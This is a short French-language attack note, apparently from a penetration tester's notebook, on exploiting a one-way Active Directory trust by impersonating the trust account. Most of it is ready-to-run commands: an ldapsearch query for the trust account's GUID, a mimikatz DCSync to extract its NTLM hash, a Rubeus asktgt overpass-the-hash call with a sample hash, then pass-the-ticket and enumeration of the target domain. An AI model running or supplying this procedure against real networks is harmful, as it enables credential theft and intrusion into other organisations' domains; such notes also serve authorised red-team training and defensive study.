
> [!Warning]
> Le domaine cible ne nous fait pas confiance mais l'inverse est vrai.
> Le seul moyen d'exploiter ce trust est d'usurper le trustedAccount.

1. Identifier le GUID du trustAccount

```
ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
```

2. DCSync le trustAccount avec le GUID et récupérer le hash NTLM

```
mimikatz lsadump::dcsync /domain:partner.com /guid:{[GUID]}
```

2. Faire un OverPass the hash afin de récupérer un TGT

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap
```

3. Pass The Ticket avec le TGT -> [[3. Pass the Ticket (T1550.003)]]

4. Vérifier le ticket en cache

```
run klist
```

5. Enumérer le domaine cible -> [[1. LDAP#Enumération de l'AD]] (penser à rajouter --hostname <domain.com> à chaque commande pour interroger le bon DC.)

